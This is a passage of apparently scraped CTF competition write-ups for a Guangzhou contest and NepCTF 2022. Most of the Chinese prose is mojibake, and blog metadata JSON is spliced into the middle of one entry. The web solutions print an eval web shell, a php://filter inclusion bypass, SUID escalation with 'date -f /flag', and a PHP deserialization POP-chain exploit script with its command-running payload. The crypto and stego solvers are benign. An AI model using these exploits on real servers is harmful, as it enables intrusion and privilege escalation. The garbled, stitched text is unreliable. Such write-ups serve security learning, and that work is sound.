å¤§èµ›ç”±ä¸­å…±å¹¿å·å¸‚å§”ç½‘ç»œå®‰å…¨å’Œä¿¡æ¯åŒ–å§”å‘˜ä¼šåŠå…¬å®¤ä½œä¸ºæŒ‡å¯¼å•ä½ï¼Œå¹¿å·å¸‚ç½‘ç»œå®‰å…¨äº§ä¸šä¿ƒè¿›ä¼šä¸»åŠï¼Œå¹¿ä¸œå¤–è¯­å¤–è´¸å¤§å­¦ã€æ­å·å®‰æ’ä¿¡æ¯æŠ€æœ¯è‚¡ä»½æœ‰é™å…¬å¸æ‰¿åŠï¼Œå¹¿å·å¸‚ä¿¡æ¯å®‰å…¨æµ‹è¯„ä¸­å¿ƒã€å¹¿å·äº’è”ç½‘åä¼šååŠã€‚ å¤§èµ›ä»¥â€œç½‘ç»œå®‰å…¨ä¸ºäººæ°‘ã€ç½‘ç»œå®‰å…¨é äººæ°‘â€ä¸ºä¸»é¢˜ï¼Œæ—¨åœ¨é€šè¿‡ç«èµ›çš„æ–¹å¼æé«˜å‚èµ›é€‰æ‰‹æ”»é˜²å…¼å¤‡çš„ç½‘ç»œå®‰å…¨å®è·µæŠ€èƒ½ï¼Œå®ç°ä»¥èµ›ä¿ƒå­¦ã€ä»¥èµ›ä¼šå‹ï¼ŒåŠ å¼ºä¸åŒé™¢æ ¡åŠå•ä½é—´çš„æŠ€æœ¯äº¤æµã€‚ æœ¬å±Šå¤§èµ›ç”±ã€å¹¿å¤–å¥³ç”Ÿæˆ˜é˜Ÿã€‘ä¸æ­å·å®‰æ’ä¿¡æ¯æŠ€æœ¯è‚¡ä»½æœ‰é™å…¬å¸å…±åŒå‘½é¢˜ï¼Œé‡‡ç”¨CTFï¼ˆå¤ºæ——èµ›ï¼‰å›¢é˜Ÿç«èµ›æ¨¡å¼ï¼Œå‚èµ›é˜Ÿä¼é€šè¿‡äº’è”ç½‘åœ¨çº¿è§£é¢˜ï¼Œé¢˜ç›®ç±»å‹æ¶‰åŠWebå®‰å…¨ã€é€†å‘å·¥ç¨‹ (Reverse)ã€äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜å’Œåˆ©ç”¨ï¼ˆPwnï¼‰ã€å¯†ç å­¦ï¼ˆCryptoï¼‰ã€æ‚é¡¹ï¼ˆMiscï¼‰ç­‰ç±»åˆ«ã€‚ æ¯”èµ›æ—¶é—´ï¼š9æœˆ3æ—¥ 9:00 - 9æœˆ4æ—¥ 9:00 WEBrce_me ç®€å•web 1234567891011121314151617&lt;?php(empty($_GET[&quot;file&quot;])) ? highlight_file(__FILE__) : $file=$_GET[&quot;file&quot;];function fliter($var): bool&#123; $blacklist = [&quot;&lt;&quot;,&quot;?&quot;,&quot;$&quot;,&quot;[&quot;,&quot;]&quot;,&quot;;&quot;,&quot;eval&quot;,&quot;&gt;&quot;,&quot;@&quot;,&quot;_&quot;,&quot;create&quot;,&quot;install&quot;,&quot;pear&quot;]; foreach($blacklist as $blackword)&#123; if(stristr($var, $blackword)) return False; &#125; return True;&#125; if(fliter($_SERVER[&quot;QUERY_STRING&quot;]))&#123;include $file;&#125;else&#123;die(&quot;Noooo0&quot;);&#125; éé¢„æœŸã€‚Dirsearchæ‰«ä¸€ä¸‹å‘ç°ä»–äººä¸Šä¼ çš„shell.phpï¼Œåˆ©ç”¨fileå‚æ•°include+ä¼ªåè®®åŒ…å«ä¸€ä¸‹ï¼š ?file=php://filter/read=convert.base64-encode/resource=shell.php base64è§£ç å¾—åˆ°æºç ï¼š&lt;?php @eval($_POST[a]);?&gt; ç”¨èšå‰‘è¿æ¥ä¸Šï¼Œåœ¨æ ¹ç›®å½•ä¸‹å‘ç°flagï¼Œä½†æ˜¯æƒé™ä¸å¤Ÿæ— æ³•æŸ¥çœ‹ã€‚ find / -user root -perm -4000 -print 2&gt;/dev/null æŸ¥çœ‹å…·æœ‰SUIDæƒé™çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå‘ç°dateå‘½ä»¤å¯ç”¨ï¼Œææƒï¼š date -f /flag åœ¨æŠ¥é”™æ–‡å­—ä¸­è·å–flagå†…å®¹ã€‚ â€‹ Safepop Wake up!Pop corn is not safe food, 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phperror_reporting(E_ALL);ini_set(&#x27;display_errors&#x27;, true);highlight_file(__FILE__);class Fun&#123; private $func = &#x27;call_user_func_array&#x27;; public function __call($f,$p)&#123; call_user_func($this-&gt;func,$f,$p); &#125; public function __wakeup()&#123; $this-&gt;func = &#x27;&#x27;; die(&quot;Don&#x27;t serialize me&quot;); &#125;&#125;class Test&#123; public function getFlag()&#123; system(&quot;cat /flag?&quot;); &#125; public function __call($f,$p)&#123; phpinfo(); &#125; public function __wakeup()&#123; echo &quot;serialize me?&quot;; &#125;&#125;class A&#123; public $a; public function __get($p)&#123; if(preg_match(&quot;/Test/&quot;,get_class($this-&gt;a)))&#123; return &quot;No test in Prod\\n&quot;; &#125; return $this-&gt;a-&gt;$p(); &#125;&#125;class B&#123; public $p; public function __destruct()&#123; $p = $this-&gt;p; echo $this-&gt;a-&gt;$p; &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; $pop = $_GET[&#x27;pop&#x27;]; $o = unserialize($pop); throw new Exception(&quot;no pop&quot;);&#125; æ‰¾ååºåˆ—åŒ–popé“¾ï¼š Test/getFlag() &lt;- A/__get($p) &lt;- B/__destruct() ç”±äºç±»Aå­˜åœ¨è¿‡æ»¤ preg_match(&quot;/Test/&quot;,get_class($this-&gt;a))ï¼Œç±»Aä¸èƒ½è°ƒç±»Testï¼Œåˆ©ç”¨ä¸Šç±»Funï¼š Fun/__call($f,$p) &lt;- A/__get($p) &lt;- B/__destruct() ç¼–å†™è„šæœ¬ï¼š 1234567891011121314151617181920from phpserialize import serializefrom urllib.parse import * class Test: pass class Fun: private_func = &#x27;system&#x27; class A: public_a = Fun() class B: # public_p = &#x27;ls /&#x27; public_p = &#x27;cat /flag?&#x27; public_a = A() print(quote(serialize(B())))# O%3A1%3A%22B%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A1%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A1%3A%22p%22%3Bs%3A10%3A%22cat%20/flag%3F%22%3B%7D ç”±äºç±»Funæœ‰ __wakeup() ä¼šæ¸…ç©º private $funcï¼Œä¿®æ”¹æ•°å­—ç»•è¿‡ __wakeup()ï¼š O%3A1%3A%22B%22%3A3%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A1%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A1%3A%22p%22%3Bs%3A10%3A%22cat%20/flag%3F%22%3B%7D ä¼ å…¥popå‚æ•°å¾—åˆ°flagã€‚ â€‹ MISCwhere_is_secret easy_misc ä¸€ä¸ªvig.txtå’Œä¸€ä¸ªzipå‹ç¼©åŒ…ï¼Œtxtä¸­æ–‡å­— Naseu bybkjkl, O wt mna Wkkopwkja hl Qrkgeux Fasxtorr. Zdl Kaozbgj hksu oty fblz hhntyoxj wu tzphvq ku Nqnhbta, hgj pox Qupo geyiuna ago ixkj jhtpyhrhlw hu aak Nblyehg gntr. Nahkj pvwgu pl QBJ Vxwgr Zdbkyzhr, O jlxj ovfkkux zk ikojn fk 29.94 bpgmay-layrbtc vkocpggh jaoyrxt wz kgpphto uhc. Soxt E yxvas mna Ynyoptt wyfe, E dbrh pgbeax ekb mu yvfk pv Nqnhbta ah ha aak rpvk lyxyekxtp.aak lhlysvkj ez ZCDA@K1tz0frjo ä½¿ç”¨åœ¨çº¿ç»´å‰å°¼äºšå¯†ç è§£å¯†ç½‘ç«™è§£å‡ºæ˜æ–‡ï¼š Hello friends, I am the President of Ukraine Zelensky. The Russian army has just launched an attack on Ukraine, and the Kyiv airport has been controlled by the Russian army. Heard today is KFC Crazy Thursday, I need someone to bring me 29.94 finger-sucking original chicken as rations now. When I repel the Russian army, I will invite you to come to Ukraine to be the vice president.the password is GWHT@R1nd0yyds ç”¨å¯†ç  GWHT@R1nd0yyds è§£å‹zipï¼Œå¾—åˆ°ä¸€å¼ bmpå›¾ï¼Œæ ¹æ®æ¯”èµ›ä¸­æœŸæ”¾çš„hintæç¤ºåŠ å¯†è„šæœ¬ï¼š 12345678910111213141516171819202122232425262728from PIL import Imageimport mathdef encode(text): str_len = len(text) width = math.ceil(str_len ** 0.5) im = Image.new(&quot;RGB&quot;, (width, width), 0x0) x, y = 0, 0 for i in text: index = ord(i) rgb = (0, (index &amp; 0xFF00) &gt;&gt; 8, index &amp; 0xFF) im.putpixel((x, y), rgb) if x == width - 1: x = 0 y += 1 else: x += 1 return imif __name__ == &#x27;__main__&#x27;: with open(&quot;829962.txt&quot;, encoding=&quot;gbk&quot;) as f: all_text = f.read() im = encode(all_text) im.save(&quot;out.bmp&quot;) é€šè¿‡çˆ†ç ´æ–¹æ³•é€†å›åŸæ–‡æœ¬å³å¯ï¼Œå‘ç°åŸæ–‡ä¸ºä¸€æœ¬ä¹¦ï¼ŒåŒ…å«å¤§é‡ä¸­æ–‡ï¼Œè¿˜åŸæ—¶è®¾ç½®ä¸è¾“å‡ºä¸­æ–‡ï¼Œç¼©çŸ­è¿è¡Œæ—¶é—´ï¼š 123456789101112131415161718192021222324252627from PIL import Imageimg = Image.open(r&#x27;out.bmp&#x27;)width, height = img.sizetext=&#x27;&#x27;x, y = 0, 0for i in range(200000): try: r,g,b = img.getpixel((x,y)) for j in range(126): if ((j &amp; 0xFF00) &gt;&gt; 8) == g and j &amp; 0xFF == b: text+=chr(j) break else: pass if x == width - 1: x = 0 y += 1 else: x += 1 except: breakprint(x,y)open(r&#x27;text.txt&#x27;,&#x27;w&#x27;).write(text) åœ¨å¾—åˆ°çš„å­—ç¬¦é‡Œï¼Œæ‰¾åˆ°flagæ ¼å¼çš„ä¸”å¸¦æœ‰æ„ä¹‰çš„å­—ç¬¦ï¼Œç»„æˆflagï¼šflag&#123;h1d3_1n_th3_p1ctur3&#125;ã€‚ â€‹ è¿·å¤±å¹»å¢ƒ èµ°ä¸å‡ºè‡ªè´£ç©ºé—´ï¼Œæ²‰æººäºæˆ‘ä»¬æ˜¨å¤©ï¼Œè¿˜èƒ½ä¸èƒ½ç›¸è§ã€‚ ç”¨DiskGeniusæ‰“å¼€vmdkæ–‡ä»¶ï¼Œåœ¨å›æ”¶ç«™å‘ç°ä¸€å¼ å¯è‰jpgå›¾ç‰‡å’Œä¸€å¼ æ— æ–‡ä»¶ç±»å‹åç¼€çš„å¹»å¢ƒpngå›¾ç‰‡ï¼Œæå–å‡ºæ¥ã€‚ åœ¨â€œè¿·å¤±å¹»å¢ƒâ€å¤¹å­é‡Œæœ‰1å¼ å¯è‰jpgå›¾ç‰‡å’Œ100å¼ ä¸€æ ·çš„å¹»å¢ƒpngå›¾ç‰‡ï¼Œå‰åç›¸åŒå›¾ç‰‡çš„å¤§å°ä¸åŒï¼Œå°è¯•ç›²æ°´å°æå–ä¿¡æ¯ä¸æˆåŠŸï¼Œå†å°è¯•å°†å¹»å¢ƒpngå¤§å›¾ä¸å°å›¾è¿›è¡Œå‡ï¼ˆsubï¼‰æ“ä½œï¼Œå¾—åˆ° keyä¸º å¯è‰å‰æ¥æŠ¥é“ã€‚ å›æ”¶ç«™é‡Œå¯è‰jpgå›¾ç‰‡å­˜åœ¨å¤‡æ³¨ä¿¡æ¯ çŒœä¸åˆ°ï¼Œæ€ä¹ˆæƒ³éƒ½çŒœä¸åˆ°å§ã€‚ï¼Œç”¨outguessæå–ï¼š outguess -r keli.jpg -k &quot;å¯è‰å‰æ¥æŠ¥é“&quot; -t out.txt å¾—åˆ°flagï¼šDASCTF&#123;f473a6fd2de17a0c5794414b3905ebbe&#125;ã€‚ â€‹ ç­¾ä¸ªåˆ° ç­¾ä¸ªåˆ°ï¼Œè¯·æ³¨æ„ï¼Œæœ¬æ¬¡æ¯”èµ›æ‰€æœ‰ flag æäº¤æ—¶éƒ½åªéœ€è¦æäº¤æ‹¬å·å†…çš„å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚è¿™ä¸ªé¢˜çš„ flag å¦‚æœæ˜¯ flag{xxx}, æ‚¨åªéœ€è¦æäº¤ xxx å³å¯å¾—åˆ†ã€‚ ZMJTPM33TIGQTLMDTV4JXLYQTNMQTAOLTSGTRMOLZD2JPMOETIEQBZ3PTZ2U2===ï¼Œåˆçœ‹ä¸ºbase32ï¼Œè§£ç ä¸ºä¹±ç ã€‚ flag&#123; å¯¹åº”base32ç¼–ç ä¸º MZWGCZ33ï¼Œæ•…ä¸ºrot13+base32ï¼Œè§£ç å¾— flag&#123;5f3c029eac023481fbd8d5ad15b73b34&#125;ã€‚ â€‹ CRYPTOLRSA RSA and some other things 1234567891011121314151617181920212223242526from Crypto.Util.number import *import gmpy2from flag import flagm=bytes_to_long(flag)def getPQ(p,q): P=getPrime(2048) Q=getPrime(2048) t=(p*P-58*P+q)%Q assert (isPrime(Q)) return P,Q,tB=getRandomNBitInteger(11)p=getPrime(B)q=getPrime(B)n=p*qe=65537c=pow(m,e,n)P,Q,t=getPQ(p,q)print(&quot;B=&quot;,B)print(&quot;P*P*Q=&quot;,P*P*Q)print(&quot;P*Q*Q=&quot;,P*Q*Q)print(&quot;t=&quot;,t)print(&quot;c=&quot;,c) $\\gcd(P \\cdot P \\cdot Q,P \\cdot Q \\cdot Q)=P \\cdot Q$ï¼Œç»§è€Œæ±‚å¾— $P$ å’Œ $Q$ï¼Œåˆæœ‰ $t=(P \\cdot(p-58)+q) \\bmod Q$ï¼Œæ„é€ æ ¼ $\\begin{bmatrix} 1 &amp; P \\newline 0 &amp; Q \\end{bmatrix}$ï¼Œåˆ©ç”¨LLLç®—æ³•è§„çº¦å¾—åˆ° $p-58$ å’Œ $q$ å€¼ã€‚ 123456789101112131415161718192021222324B = 1023PPQ = 17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981PQQ = 17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909t = 44c = 4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746e = 65537PQ = gcd(PPQ,PQQ)P = PPQ//PQQ = PQQ//PQprint(P)print(Q)A = Matrix(ZZ,[[1,P],[0,Q]])x = A.LLL()[0][0]p = -x+58q = (t-P*(p-58))%Qf = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,p*q)print(bytes.fromhex(hex(m)[2:]))# b&#x27;DASCTF&#123;8f3djoj9wedj2_dkc903cwckckdk&#125;&#x27; â€‹ EasyRsa really easy rsa 1234567891011121314151617from flag import flagfrom Crypto.Util.number import *m = bytes_to_long(flag)e = 65537f = open(&quot;output.txt&quot;, &quot;r&quot;)a = f.readlines()for i in a: n = int(i) c = pow(m, e, n) m = cprint &#x27;c = %s&#x27; % (m)f.close()&#x27;&#x27;&#x27;c = 38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727&#x27;&#x27;&#x27; gcdæµ‹è¯•å‘ç°outputä¸­çš„ $n$ æœ‰ç´ å…¬å› å­ $p$ï¼Œé€†æ¨è¿˜åŸ $m$ å³å¯ï¼š 1234567891011121314n = [65439077968397540989065489337415940784529269429684649365065378651353483030304843439003949649543376311871845618819107350646437252980144978447924976470943930075812834237368425374578215977641265884859875440799334807607478705932175148673160353577875890074101393042506714001617338265284910381849259298772642190619,86843235426823545017422014398916780909062053456790256392304973548517489132984667679637386416948409930796162377844525829968317585749956057149930523547463230147376192820753802868362225137830225967953826475779047454555958271846035526319036389127587352017149417549187850782892924691511398536178090031958365483499,57839320383142814687522363258949714784622321678585619281948174372461045134361003939684803510572969567182690634502610963365500727981041136988638273942465134797850643121827808482673619534240872593224537996099454035648829692386918230535360101064254854063175494150147494342652670585674593236663514793256521719547,52668168898129361356420333177679019946307853075463961068071790653159090226904625885080236174231665178538405547828768043706515464922611051221394704678558922339886480247663138702481349098077291584992082414494275463670330534613607852999291645500391111597009868188974671249118213040057429113174377610094956993269,79875848044631194160351918105738804229446748736206976033243436373010695259945613104837645712048695514204494137005015770637421510392760763371639480133851920449252506525423837434811693638210458851990502785655738042348115385964604080872180121543147063180945532713593712726527002909054818485584237993215139630243,73100501797447180147684637554796375398455002202770022931512541062214916136294604754404667725341796896161398464327153718845280194035978972665664657052946003418121755545770123205426883869361411412259838522099085901563107814985172942977520233320215882707710717870398128412272218474014381169303848087621856187879,89149546555397759430343098936690138982544367561661914051499112345535238108800665531588376806546499374457634397161670140520060064963391826220177798442707381640723248034061313974522233415815795656570220902974484865176728535660627712374835329967608728216749734529761431592345816592875807318876347151421393671763,66449107450661172442868032153863675098235855689218695279414435182923510356012957155941548483160873271040452368644926703812707864779900715051152673705082002761445847561495295455460041902473282731259268870375921215589157288622757488879539441498396276257589120302991242300378364101246448094955634459779361686643,79694880331320743031437708811856697413105291652061062223857313580221562305807771003185061831752133665835648647560103986928466217390444724672894866216636981793418219455653595717274553950715056120806463449033181486699963584346517910081706586345546292894426402568226579894766693070066214488743160957135286739213,70521001788476157145543175674209083194325853388116385624440232036679708917857095748070597575068955423165296665429648694541353249787337464272095260410717659726012806836884799476995758902361678737968193674368688353935424186389207123637734230550266810766585903134004322848985320790788169777840924595645463787189,51801430118171456966246071852561156183140136541960623661080056673664466785669585092926482194691254461430866302262960624015915371927788809661387318097968209364907625599562339722700041444342116899266802018340155635959614677597708758012024981583143521259152639480003228924151971208695043251548758407218187895663,87310111118839703578797261862424304499548882114635944516216618095145194843718635007052242072452831460162126955481326379219639313067967998826898344673513019946299427614605216960081461930080199023399060417820769438661351988322185620598552697590115678078498754112860310272842870106790357443602405008865116282919]e = 65537p = 7552850543392291177573335134779451826968284497191536051874894984844023350777357739533061306212635723884437778881981836095720474943879388731913801454095897c = 38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727for i in range(len(n)-1,-1,-1): q = int(n[i]//p) f = (p-1)*(q-1) d = inverse_mod(e,f) c = int(pow(c,d,n[i])) print(bytes.fromhex(hex(c)[2:]))# b&#x27;GWHT&#123;gixkJl7SJTcpLOL9zqwo&#125;&#x27; â€‹ Solomenâ€™s puzzle 1 F1oweråšæ¢¦æ¢¦è§äº†Reedå’ŒSolomenï¼Œä»–ä»¬å‘Šè¯‰äº†F1owerè´¢å¯Œå¯†ç ï¼Œä½†æ˜¯F1owerè®°é”™äº†å‡ ä¸ªå­—èŠ‚ã€‚ã€‚è¯·å°†æœ€ç»ˆå¾—åˆ°çš„å®Œæ•´flag(åŒ…å«DASCTF{})è¿›è¡ŒMD5åå†æäº¤ï¼Œå³æäº¤ï¼š`â€DASCTF","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022èµ›","slug":"2022èµ›","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"NepCTF 2022","slug":"match-NepCTF-2022","date":"2022-07-17T13:18:30.000Z","updated":"2022-07-17T16:14:32.991Z","comments":true,"path":"2022/07/17/match-NepCTF-2022/","permalink":"https://lazzzaro.github.io/2022/07/17/match-NepCTF-2022/","excerpt":"","text":"â€‹ â€œNepCTF 2022â€æ˜¯ç”±Nepnepè”åˆç«™é˜Ÿä¸»åŠçš„å…¬ç›Šæ‹›æ–°èµ›äº‹ï¼Œæ—¨åœ¨ä»¥æœ‰ä»£è¡¨æ€§ã€æœ‰ç‰¹è‰²çš„é¢˜ç›®åŸ¹å…»æ–°ç”Ÿç½‘ç»œå®‰å…¨èƒ½åŠ›ã€‚ æ¯”èµ›æ—¶é—´ï¼š2022å¹´7æœˆ15æ—¥10:00 - 2022å¹´7æœˆ17æ—¥10:00ã€‚ æ¯”èµ›å½¢å¼ï¼šä¸ªäººè§£é¢˜èµ› æ¯”èµ›é“¾æ¥ï¼šhttp://nep.lemonprefect.cn/ æ¯”èµ›å¹³å°ï¼šPower by CTFm NepCTF 2022èµ›äº‹è¯´æ˜æ–‡æ¡£ï¼šhttps://www.wolai.com/nepnep/4c2ZG1UaTnVMmyYsKB5duj Rank: 4 MISCç­¾åˆ°é¢˜ æé™å¥—å¨ƒ flagæ ¼å¼ä¸ºnepctf{} jpgä¸­æå–å‡ºzipå‹ç¼©åŒ…ï¼Œzipå‹ç¼©åŒ…å¥—å¨ƒ232å±‚ï¼Œç”¨cyberchef label+jumpå¾ªç¯æå–å‡ºæœ€å†…å±‚çš„pcapæ–‡ä»¶ï¼› wiresharkæ‰“å¼€å‘ç°ä¸ºUSBé”®ç›˜æµé‡ï¼Œtsharkå·¥å…·æå–å‡ºusb.capdataæ•°æ®ï¼Œç”¨è„šæœ¬è¿˜åŸé”®ä½ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465normalKeys = &#123; &quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;, &quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;, &quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\\\&quot;, &quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;, &quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;, &quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;, &quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;shiftKeys = &#123; &quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;, &quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;, &quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\\&quot;&quot;, &quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;, &quot;3b&quot;:&quot;&lt;F2&gt;&quot;, 